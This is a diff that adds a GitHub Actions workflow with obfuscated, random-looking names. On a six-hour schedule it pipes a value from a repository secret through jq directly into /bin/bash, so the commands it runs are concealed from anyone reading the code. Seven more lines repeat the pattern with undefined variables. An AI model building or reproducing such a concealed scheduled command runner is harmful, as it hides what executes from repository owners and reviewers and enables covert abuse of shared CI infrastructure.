@@ -1,0 +1,25 @@
+name: yuedagushun
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuedagushun
+        env:
+          gqxb35916: ${{ secrets.gqxb35916 }}
+        run: |
+          echo $gqxb35916 | jq -r .pg78 | /bin/bash
+          echo $mtc6 | jq -r .szav84952 | /bin/bash
+          echo $wl41 | jq -r .vwpcp7523 | /bin/bash
+          echo $hthmu47 | jq -r .au0375 | /bin/bash
+          echo $j96 | jq -r .ijuc40398 | /bin/bash
+          echo $bj3721 | jq -r .o32 | /bin/bash
+          echo $qvhjd9104 | jq -r .rfitr3 | /bin/bash
+          echo $hhv97925 | jq -r .lot250 | /bin/bash
+
